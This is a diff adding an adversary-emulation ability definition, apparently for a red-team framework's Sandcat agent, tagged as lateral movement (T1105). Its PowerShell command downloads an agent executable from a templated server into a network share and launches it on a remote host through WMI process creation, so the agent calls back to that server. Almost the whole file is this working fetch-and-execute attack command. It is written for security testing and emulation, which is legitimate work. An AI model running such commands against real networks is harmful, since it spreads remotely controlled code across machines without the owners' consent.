@@ -1,0 +1,28 @@
+- description: Copy Sandcat file using PowerShell
+  id: 3734aa1e-c536-42b3-8912-4c91b8bdce90
+  name: Copy Sandcat File using Powershell
+  platforms:
+    windows:
+      psh:
+        command: '$server="#{server}";
+
+          $sharePath="#{share}";
+
+          Set-Location $sharePath;$url="$($server)/file/download";
+
+          $wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");
+
+          $wc.Headers.add("file","sandcat.go");($data=$wc.DownloadData($url)) -and
+          ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""))
+          -and ([io.file]::WriteAllBytes("$($sharePath)$name.exe",$data));
+
+          $startServer="$($sharePath)$name.exe -server $($server) ";Invoke-Command
+          -ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod
+          -Class Win32_Process -Name Create -ArgumentList "$($sharePath)$name.exe
+          -server $server -v" } -ComputerName #{remote.host.name} -ArgumentList $startServer,
+          $sharePath, $name, $server'
+        payload: sandcat.go-windows
+  tactic: lateral-movement
+  technique:
+    attack_id: T1105
+    name: Remote File Copy
